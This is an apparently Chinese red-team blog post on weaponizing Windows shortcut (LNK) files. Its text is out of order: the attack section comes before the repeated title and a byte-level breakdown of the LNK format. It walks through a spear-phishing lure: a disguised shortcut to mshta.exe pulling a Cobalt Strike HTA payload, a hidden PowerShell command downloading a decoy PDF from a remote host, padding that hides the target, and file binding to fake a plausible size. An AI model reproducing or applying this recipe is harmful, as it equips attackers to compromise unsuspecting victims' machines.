
![图片34 效果展示](upload/attach/202007/879321\_AWGNED9ZP95G4S5.jpg)

但这时双击该文件会报错：

![图片35 报错](upload/attach/202007/879321\_5RB88CG8XREYSPN.jpg)

所以我们需要再修改`LinkTargetIDList`中第五个`ItemID`：

![图片36 修改第五个ItemID](upload/attach/202007/879321\_NN3TNJSQ72R2AFC.jpg)

如此一来，打开该文件便会弹出计算器：

![图片37 弹出计算器](upload/attach/202007/879321\_QHRUZDRFGGEA9GX.jpg)

## 0x03 扩展:

首先新建一指向`%windir%/System32/mshta.exe`的快捷方式(文件名尽量带有迷惑性)，并更改其图标为`%SystemRoot%/System32/SHELL32.dll`中任意一个：

![图片38 mshta](upload/attach/202007/879321\_DQS55WS5EAU4BN9.jpg)

之后更改其参数为`HTA`下载地址：

![图片39 文件下载](upload/attach/202007/879321\_HAZ4QTFGHHC3E9E.jpg)

注：笔者是使用`Cobalt Strike`生成`HTA`文件：

![图片39[1] 生成HTA](upload/attach/202007/879321\_T4AWEQ6B625BF6K.jpg)

于其执行`payload`前增加如下语句（用于下载诱饵文档并且进行打开，同时诱饵文档的显示有多种方法，这里只是举一个例子）：

```vb
Dim open\_pdf
Set open\_pdf = CreateObject("Wscript.Shell")
open\_pdf.run "powershell -nop -w hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.3.27:8080/1.pdf',$env:temp+'/LNK文件格式解析(修改版).pdf');Start-Process $env:temp'/LNK文件格式解析(修改版).pdf'", 0, true
```

这样一来，在受害者打开`LNK`文件后会从远程下载一正常`PDF`文档并打开。

接下来按照`0x02`部分所述方法修改即可，此处加一个Tip——在其`WORKING_DIR`字符串前面添加大量空格字符，使其目标长度超过`260`个字符：

![图片40 添加空格字符](upload/attach/202007/879321\_SCARVK6UBFXHR2C.jpg)

使用`copy /B`命令将其与正常`PDF`文档捆绑，使其文件大小看起来更具有说服力：

![图片41 文件大小](upload/attach/202007/879321\_5AKCGJHHPHWGWQX.jpg)

之后双击该`LNK`文件，主机便会上线，而受害者会看到一正常的`PDF`文档：

![图片42 主机上线](upload/attach/202007/879321\_UWVPXTKPDWGHFRV.jpg)

效果展示：

![图片43 效果](upload/attach/202007/879321\_JSK29FA83QT8DUA.jpg)

## 0x04.注意事项:

文中只是以`pdf`为后缀做了一个例子，看官在具体进行构造的时候可以使用其他的后缀，只要是后面以`10 00 00 00`结尾即可

![图片44 不同后缀的情况](upload/attach/202007/879321\_PJT8B3PC5ZHA756.jpg)

当然看官也可以通过修改前面的规定数据大小的值以实现不拘泥于数字与字母的命名方式

如上图中的`docx`所示其数据大小为`9`，数据值为`.\11.docx`而下面的`png`所显示的数据大小为`7`，数据值为`.\1.png`。经过反复的修改测试可得知，只要其数据值能够符合其前面规定的数据块其就可以正常解析并且显示。

## 0x05.结语:

本文属于抛砖引玉，其所使用的技术也不是很新颖。但的确可以在一定程度上起到迷惑的作用，故本绝影小组认为值得分享，同时鉴于有不少的**APT**组织(例如`Gamaredon`、`Oceanlotus`、`SideWinder`等)也同样进行`lnk`载荷的投递，希望各单位可以培养针对相关鱼叉载荷的安全意识，以减少损失。

# HW在即——红队活动之Lnk样本载荷篇

```
注意:

1.本篇文章由Gcow安全团队绝影小组原创(主要研究于红蓝对抗领域)

2.本篇文章一共2700多字,44张图,预计用时8分钟

3.希望各位看官如果在看到错误的地方可以在私信或者评论向笔者指出,笔者将感激不尽

4.如果因为本篇文章而造成的相关损失本公众号不给予赔偿.

5.本篇文章只是学习交流,若出现因通过本篇文章而出现进行的攻击活动,本公众号概不负责

```

## 0x00.前言:

在日常的活动中，我们都可以看到`LNK`载荷的存在，从U盘蠕虫对U盘文件进行伪装，以达到欺骗受害人点击的目的，再到红队活动甚至于部分`APT`组织也使用了`LNK`文件作为其投递的主要载荷。`LNK`文件的载荷拥有**自动隐藏.lnk后缀名，从而展现伪装的后缀名以欺骗目标**的特点而被广泛使用，下面我们将先通过解析`LNK`文件格式进行切入，再通过其基础进行样本的相关构造，最后我们会介绍一些需要注意的地方。也希望各位看官如果在看到错误的地方可以在私信或者评论向笔者指出，笔者将感激不尽。

另外本样本不讨论相关的免杀性，免杀的操作请各位看官自己实现。

## 0x01 LNK文件格式解析:

文件前`20`字节固定不变：

![图片1 文件前20字节](https://bbs.kanxue.com/upload/attach/202007/879321_W7CYQ2T4NJFC9WG.jpg)

- `HeaderSize`(4 bytes, `offset 0x00`)：0x0000004C

- `LinkCLSID`(16 bytes, `offset 0x04`)：00021401-0000-0000-C000-000000000046

### 0x01.1 `LinkFlags`

由`offset 0x14`起始4字节为`LinkFlags`(下图来自微软官方文档)：

![图片2 LinkFlags定义](https://bbs.kanxue.com/upload/attach/202007/879321_ZEHR9CYW2A8RMK3.jpg)

由图片2可以看到，该文件`LinkFlags`为`0x000802DB`(Bin：`0000 0000 0000 1000 0000 0010 1101 1011`)，这表示以下Flag被设置：

- `HasLinkTargetIDList`
- `HasLinkInfo`
- `HasRelativePath`
- `HasWorkingDir`
- `HasIconLocation`
- `IsUnicode`
- `HasExpIcon`
- `DisableLinkPathTracking`

上述Flag会在下文解释，故此处先不做展开。

### 0x01.2 `FileAttributes`

由`offset 0x18`起始`4`字节为`FileAttributes`，`0x00000020`表示`FILE_ATTRIBUTE_ARCHIVE`。

### 0x01.3 `CreateTime` & `AccessTime` & `WriteTime`

由`offset 0x1C`开始，每个字段各占`8`字节：

![图片3 Time](https://bbs.kanxue.com/upload/attach/202007/879321_BF2RV4SSJE7X2D2.jpg)

### 0x01.4 `FileSize`

由图4可以看到，`FileSize`为`0x000E0400`(占`4`个字节)。

### 0x01.5 `IconIndex`

`IconIndex`为`0x00000001`(占`4`个字节)。

### 0x01.6 `ShowCommand` & `Hotkey`

![](https://bbs.kanxue.com/upload/attach/202007/879321_GEHZX8RC4P5HK87.jpg)

由`offset 0x3C`开始，`ShowCommand`占`4`字节，`0x00000001`表示`SW_SHOWNORMAL`，当然也可以根据具体的需要替换为`SW_SHOWMAXIMIZED (0x00000003)`（**窗口最大化**）以及`SW_SHOWMINNOACTIVE (0x00000007)`（**窗口最小化**）

`Hotkey`占`2`字节；余下`10`个字节均为保留位。

### 0x01.7 `LinkTargetIDList`

由于`LinkFlags`中`HasLinkTargetIDList`设为`1`，故文件包含`LinkTargetIDList`结构。`LinkTargetIDList`构成如下：

![图片5 LinkTargetIDList](https://bbs.kanxue.com/upload/attach/202007/879321_U6MATNHE875VJRB.jpg)

而`IDList`由`ItemID`构成，以`2`字节全为`0`的`TerminalID`作为结束：

![图片6 ItemID](https://bbs.kanxue.com/upload/attach/202007/879321_TAU8DZW8QS2TXPY.jpg)

下面来看示例文件中的`LinkTargetIDList`：

![图片7 LinkTargetIDList示例](https://bbs.kanxue.com/upload/attach/202007/879321_MJVDUQ3FVA7J7CE.jpg)

上图红色部分为`IDListSize`，绿色部分为`TerminalID`，中间**蓝色**部分则为`IDList`。下面来看`IDList`，第一个`ItemID`如下：

- `ItemIDSize`(2 bytes, `offset 0x004E`)：0x0014
- `Data`(12 bytes, `offset 0x0050`)：根据微软官方文档给出的信息，其含义为computer

第二个`ItemID`：

![图片8 ItemID-2](https://bbs.kanxue.com/upload/attach/202007/879321_MZN5DJJVHFBJ4MR.jpg)

- `ItemIDSize`(2 bytes, `offset 0x0062`)：0x0019
- `Data`(23 bytes, `offset 0x0064`)：其含义为`c:`

第三个`ItemID`：

![图片9 ItemID-3](https://bbs.kanxue.com/upload/attach/202007/879321_M6J5S4KQTP9YMSH.jpg)

不再赘述，其含义为`Windows`。

第四个`ItemID`：

![图片10 ItemID-4](https://bbs.kanxue.com/upload/attach/202007/879321_88SBXA2KSWFFV52.jpg)

其含义为`System32`。

第五个`ItemID`：

![图片11 ItemID-5](https://bbs.kanxue.com/upload/attach/202007/879321_C9TGFHF9K5RXWVS.jpg)

### 0x01.8 `LinkInfo`

由于`LinkFlags`中`HasLinkInfo`设为1，故文件包含`LinkInfo`结构。`LinkInfo`构成如下：

![图片12 LinkInfo](https://bbs.kanxue.com/upload/attach/202007/879321_NMBTK9YYM6YMG86.jpg)

下面来看下示例文件中的`LinkInfo`：

![图片13 LinkInfo示例](https://bbs.kanxue.com/upload/attach/202007/879321_HDQ97E69P98BHDF.jpg)

- `LinkInfoSize`(4 bytes, `offset 0x017B`)：0x00000053
- `LinkInfoHeaderSize`(4 bytes, `offset 0x017F`)：`LinkInfo`结构定义中指定该字段为0x0000001C
- `LinkInfoFlags`(4 bytes, `offset 0x0183`)：0x00000001，表示`VolumeIDAndLocalBasePath`标志位设为1
- `VolumeIDOffset`(4 bytes, `offset 0x0187`)：0x0000001C，自`offset 0x017B`处`VolumeID`偏移大小
- `LocalBasePathOffset`(4 bytes, `offset 0x018B`)：0x00000035，自`offset 0x017B`处`LocalBasePath`偏移大小
- `CommonNetworkRelativeLinkOffset`(4 bytes, `offset 0x018F`)：0x00000000，`CommonNetworkRelativeLink`不存在
- `CommonPathSuffixOffset`(4 bytes, `offset 0x0193`)：0x00000052，自`offset 0x017B`处`CommonPathSuffix`偏移大小
- `VolumeID`(25 bytes, `offset 0x0197`)：由于`VolumeIDAndLocalBasePath`设置为1，故包含`VolumeID`结构如下：
  - `VolumeIDSize`(4 bytes, `offset 0x0197`)：0x00000019
  - `DriveType`(4 bytes, `offset 0x019B`)：`DRIVE_FIXED`(3)
  - `DriveSerialNumber`(4 bytes, `offset 0x019F`)
  - `VolumeLabelOffset`(4 bytes, `offset 0x01A3`)：0x00000010，自`offset 0x0197`处`VolumeLabel`偏移大小
  - `Data`(9 bytes, `offset 0x01A7`)：Windows7
- `LocalBasePath`(29 bytes, `offset 0x01B0`)：由于`VolumeIDAndLocalBasePath`设置为1，故包含`LocalBasePath`——"`C:/Windows/System32/calc.exe`"。该字段为指向链接目标的完整路径。
- `CommonPathSuffix`(1 byte, `offset 0x01CD`)：空字符

### 0x01.9 `String Data`

每个`String Data`结构如下：

![图片14 String Data](https://bbs.kanxue.com/upload/attach/202007/879321_6KTVRDE6ZVCCPVM.jpg)

由于`LinkFlags`中`HasRelativePath`设为1，故文件包含`RELATIVE_PATH`字符串：

![图片15 RELATIVE_PATH](https://bbs.kanxue.com/upload/attach/202007/879321_S4EPWZRVF6XCFX7.jpg)

**红色**部分是`CountCharacters`(`Unicode`字符串长度，故应该为`0x22*2=0x44`)，**蓝色**部分则为`String`。

之后是`WORKING_DIR`字符串：

![图片16 WORKING_DIR](https://bbs.kanxue.com/upload/attach/202007/879321_BV7KXDA4HTS62YG.jpg)

`ICON_LOCATION`字符串：

![图片17 ICON_LOCATION](https://bbs.kanxue.com/upload/attach/202007/879321_6B7F6AHFPACS2QB.jpg)

### 0x01.10 `EnvironmentVariableDataBlock`

由于`LinkFlags`中`HasExpString`设为`1`，故文件包含`EnvironmentVariableDataBlock`：

![图片18 EnvironmentVariableDataBlock](https://bbs.kanxue.com/upload/attach/202007/879321_QNBGYZXDUPMFD5M.jpg)

- `BlockSize`(4 bytes)：该字段值必须为0x0314
- `BlockSignature`(4 bytes)：该字段值必须为0xA0000001
- `TargetAnsi`(260 bytes)：指定环境变量路径(ANSI字符串)，详见下图。

![图片19 TargetAnsi](https://bbs.kanxue.com/upload/attach/202007/879321_HQMRGCDUEHBZMVY.jpg)

- `TargetUnicode`(520 bytes)：指定环境变量路径(UNICODE字符串)，详见下图。

![图片20 TargetUnicode](https://bbs.kanxue.com/upload/attach/202007/879321_S2KAS24P5P8TNU5.jpg)

### 0x01.11 `EXTRA_DATA`

由零个或多个下列数据块与`TERMINAL_BLOCK`组成：
